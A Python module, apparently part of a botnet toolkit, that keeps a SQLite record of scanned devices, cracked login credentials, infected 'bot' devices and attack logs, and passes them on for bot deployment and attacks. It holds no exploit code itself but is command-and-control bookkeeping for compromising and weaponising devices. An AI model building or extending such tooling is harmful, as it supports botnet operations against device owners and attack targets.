import sqlite3
import os
from datetime import datetime
from .utils import Colors

class DatabaseManager:
    def __init__(self, db_file="research_db.sqlite"):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        """Initialize database with required tables"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # Discovered devices table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS discovered_devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE,
                port INTEGER,
                service TEXT,
                banner TEXT,
                timestamp TEXT
            )
        ''')
        
        # Compromised credentials table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS compromised_devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT,
                port INTEGER,
                username TEXT,
                password TEXT,
                service TEXT,
                timestamp TEXT
            )
        ''')
        
        # Infected devices table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS infected_devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE,
                status TEXT,
                bot_version TEXT,
                last_contact TEXT,
                timestamp TEXT
            )
        ''')
        
        # Attack logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                attack_type TEXT,
                target_ip TEXT,
                source_devices TEXT,
                status TEXT,
                start_time TEXT,
                end_time TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def add_discovered_device(self, ip, port, service, banner=""):
        """Add discovered device to database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO discovered_devices 
                (ip_address, port, service, banner, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (ip, port, service, banner, timestamp))
            conn.commit()
            print(f"{Colors.GREEN}✅ Added discovered device: {ip}:{port} ({service}){Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}Error adding device: {e}{Colors.RESET}")
        finally:
            conn.close()
    
    def add_compromised_device(self, ip, port, username, password, service):
        """Add compromised device credentials"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            cursor.execute('''
                INSERT INTO compromised_devices 
                (ip_address, port, username, password, service, timestamp)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (ip, port, username, password, service, timestamp))
            conn.commit()
            print(f"{Colors.GREEN}🔓 Compromised: {ip}:{port} - {username}:{password}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}Error adding compromised device: {e}{Colors.RESET}")
        finally:
            conn.close()
    
    def add_infected_device(self, ip, status="active", bot_version="1.0"):
        """Add infected device"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO infected_devices 
                (ip_address, status, bot_version, last_contact, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (ip, status, bot_version, timestamp, timestamp))
            conn.commit()
            print(f"{Colors.GREEN}🦠 Infected device: {ip}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}Error adding infected device: {e}{Colors.RESET}")
        finally:
            conn.close()
    
    def log_attack(self, attack_type, target_ip, source_devices, status="started"):
        """Log attack information"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            cursor.execute('''
                INSERT INTO attack_logs 
                (attack_type, target_ip, source_devices, status, start_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (attack_type, target_ip, str(source_devices), status, timestamp))
            conn.commit()
            print(f"{Colors.GREEN}🚀 Attack logged: {attack_type} against {target_ip}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}Error logging attack: {e}{Colors.RESET}")
        finally:
            conn.close()
    
    def show_discovered_targets(self):
        """Display discovered devices"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM discovered_devices ORDER BY timestamp DESC")
        devices = cursor.fetchall()
        
        if devices:
            print(f"\n{Colors.CYAN}=== Discovered Devices ==={Colors.RESET}")
            for device in devices:
                print(f"🔍 {device[1]}:{device[2]} - {device[3]} | {device[5]}")
        else:
            print(f"{Colors.YELLOW}No devices discovered yet.{Colors.RESET}")
        
        conn.close()
    
    def show_compromised_devices(self):
        """Display compromised devices"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM compromised_devices ORDER BY timestamp DESC")
        devices = cursor.fetchall()
        
        if devices:
            print(f"\n{Colors.CYAN}=== Compromised Devices ==={Colors.RESET}")
            for device in devices:
                print(f"🔓 {device[1]}:{device[2]} - {device[3]}:{device[4]} ({device[5]}) | {device[6]}")
        else:
            print(f"{Colors.YELLOW}No devices compromised yet.{Colors.RESET}")
        
        conn.close()
    
    def show_infected_devices(self):
        """Display infected devices"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM infected_devices ORDER BY timestamp DESC")
        devices = cursor.fetchall()
        
        if devices:
            print(f"\n{Colors.CYAN}=== Infected Devices ==={Colors.RESET}")
            for device in devices:
                print(f"🦠 {device[1]} - Status: {device[2]} | Last Contact: {device[4]}")
        else:
            print(f"{Colors.YELLOW}No devices infected yet.{Colors.RESET}")
        
        conn.close()
    
    def show_attack_status(self):
        """Display current attack status"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT * FROM attack_logs 
            WHERE status != 'stopped' 
            ORDER BY start_time DESC
        """)
        attacks = cursor.fetchall()
        
        if attacks:
            print(f"\n{Colors.CYAN}=== Active Attacks ==={Colors.RESET}")
            for attack in attacks:
                print(f"🚀 {attack[1]} -> {attack[2]} | Status: {attack[4]} | Started: {attack[5]}")
        else:
            print(f"{Colors.YELLOW}No active attacks.{Colors.RESET}")
        
        conn.close()
    
    def show_all_logs(self):
        """Display all database logs"""
        print(f"\n{Colors.CYAN}=== Complete Database Logs ==={Colors.RESET}")
        self.show_discovered_targets()
        self.show_compromised_devices()
        self.show_infected_devices()
        
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM attack_logs ORDER BY start_time DESC")
        attacks = cursor.fetchall()
        
        if attacks:
            print(f"\n{Colors.CYAN}=== Attack History ==={Colors.RESET}")
            for attack in attacks:
                print(f"📊 {attack[1]} -> {attack[2]} | {attack[4]} | {attack[5]}")
        
        conn.close()
    
    def clear_all_data(self):
        """Clear all database tables"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        tables = ['discovered_devices', 'compromised_devices', 'infected_devices', 'attack_logs']
        
        for table in tables:
            cursor.execute(f"DELETE FROM {table}")
        
        conn.commit()
        conn.close()
        print(f"{Colors.GREEN}🧹 Database cleared successfully.{Colors.RESET}")
    
    def get_compromised_devices(self):
        """Get list of compromised devices for bot deployment"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute("SELECT DISTINCT ip_address, port, username, password FROM compromised_devices")
        devices = cursor.fetchall()
        conn.close()
        
        return devices
    
    def get_infected_devices(self):
        """Get list of infected devices for attacks"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute("SELECT ip_address FROM infected_devices WHERE status = 'active'")
        devices = [row[0] for row in cursor.fetchall()]
        conn.close()
        
        return devices
